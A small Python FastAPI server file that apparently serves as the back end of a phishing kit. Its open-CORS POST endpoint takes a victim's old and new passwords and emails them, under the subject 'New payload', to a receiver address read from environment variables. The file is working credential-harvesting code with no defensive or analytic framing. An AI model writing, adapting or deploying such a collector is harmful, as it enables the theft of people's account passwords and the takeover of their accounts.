from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import smtplib
from email.mime.text import MIMEText
from dotenv import load_dotenv
import os

load_dotenv()
app = FastAPI()

# Allow all origins (CORS open for everyone)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],       # Allow all origins
    allow_credentials=True,
    allow_methods=["*"],       # Allow all HTTP methods
    allow_headers=["*"],       # Allow all headers
)

SENDER = os.getenv("SENDER")
RECIVER = os.getenv("RECIVER")
PASSWORD = os.getenv("PASSWORD")
SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = os.getenv("SMTP_PORT")


@app.get("/")
def home():
    return "<h1>Root</h1>"


@app.post("/details")
def get_details(old_password: str, new_password: str, username: str = None):
    send_email(old_password, new_password, username)
    return {"message": "email has been sent successfully"}


def send_email(old_password, new_password, username=None):
    msg = MIMEText(
        f"New details has recived. \n old password : {old_password}. \n new password : {new_password}. "
    )
    msg["Subject"] = "New payload"
    msg["From"] = SENDER
    msg["To"] = RECIVER

    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(SENDER, PASSWORD)
            server.send_message(msg)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to send data: {str(e)}")
